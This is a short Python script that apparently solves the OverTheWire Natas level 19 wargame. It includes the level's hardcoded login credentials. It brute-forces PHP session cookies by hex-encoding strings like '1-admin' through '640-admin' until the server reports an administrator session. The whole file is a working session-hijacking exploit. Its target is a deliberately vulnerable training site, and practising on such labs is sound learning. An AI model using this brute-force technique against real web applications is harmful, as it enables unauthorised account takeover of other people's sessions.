import requests         

url="http://natas19.natas.labs.overthewire.org"
auth=("natas19","tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")
data={
    "username":"username",
    "password":"password"
}
params={
    "debug":1
}
cookies={
    "PHPSESSID":"1"
}




for i in range(1,641):
    print(i)
    query=f"{i}-admin"
    sessionid=query.encode().hex()
    cookies["PHPSESSID"]=sessionid
    response=requests.post(
        url,
        auth=auth,
        data=data,
        params=params,
        cookies=cookies
    )


    if "You are an admin" in response.text:
        print(f"i: {i}\n{response.text}\n")
        break

print("done")


